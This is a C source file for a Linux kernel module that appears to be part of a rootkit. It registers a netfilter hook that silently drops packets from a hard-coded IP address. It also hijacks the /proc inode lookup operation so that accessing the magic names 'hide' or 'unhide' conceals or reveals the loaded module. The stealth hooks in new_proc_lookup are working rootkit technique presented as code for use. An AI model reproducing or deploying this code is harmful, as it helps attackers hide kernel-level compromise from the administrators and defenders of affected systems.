#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include "util.h"
#include "module.h"
#include "hidemod.h"

/* IP address we want to drop packets from, in NB order */
__be32 drop_ip  = 0x01020304;

unsigned int hook_func (unsigned int hooknum,
	struct sk_buff **skb,
	const struct net_device *in,
	const struct net_device *out, int (*okfn) (struct sk_buff *))
{
	struct sk_buff *sb = *skb;

	__be32 host_addr = ntohl(SKB_NH(sb)->saddr);

	if (host_addr == drop_ip)
	{

		printk("Dropped packet from :  %d.%d.%d.%d\n", (host_addr & 0xff000000) >> 24,
			(host_addr & 0x00ff0000) >> 16,	(host_addr & 0x0000ff00) >> 8,(host_addr & 0x000000ff));

		printk("packet fb: %d\n", ((unsigned char *)&host_addr)[0] );
		printk("packet fb: %d\n", ((unsigned char *)&host_addr)[1] );
		printk("packet fb: %d\n", ((unsigned char *)&host_addr)[2] );
		printk("packet fb: %d\n", ((unsigned char *)&host_addr)[3] );

		return NF_DROP;
	}
	else
	{
		return NF_ACCEPT;
	}
}

int new_proc_filldir(void *__buf, const char * name, int namelen, loff_t offset, ino_t ino, unsigned u)
{	
	printk("My proc filldir called: %s\n", name);
	return 0;
}

struct dentry * new_proc_lookup(struct inode *i, struct dentry *d, struct nameidata *nd)
{
	if(!strcmp(d->d_name.name, "unhide")) {
		printk("My proc lookup called: %s\n", d->d_name.name);
		show_module();
		return NULL;
	} else if( !strcmp(d->d_name.name, "hide")) {
		printk("My proc lookup called: %s\n", d->d_name.name);
		hide_module();
		return NULL;
	} else
		return proc_original_inode_operations.lookup(i, d, nd);
}

int new_proc_readdir(struct file *a, void *b, filldir_t c)
{
	return proc_original_file_operations.readdir(a, b, c);
}
